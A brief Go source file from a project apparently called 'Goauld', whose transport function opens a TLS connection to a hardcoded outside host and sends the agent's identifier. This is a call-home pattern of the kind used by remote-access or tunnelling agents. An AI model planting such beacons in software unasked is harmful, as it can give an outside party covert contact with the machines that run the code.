package transport

import (
	"Goauld/agent/agent"
	"Goauld/agent/proxy"
	"context"
	"crypto/tls"
	"net"
)

func GetTlsConn(ctx context.Context) (net.Conn, error) {
	conn, err := tls.Dial("tcp", "b.hazegard.fr:443", proxy.NewTlsConfig())
	if err != nil {
		return nil, err
	}
	_, err = conn.Write([]byte(agent.Get().Id))
	if err != nil {
		return nil, err
	}

	return conn, err
}
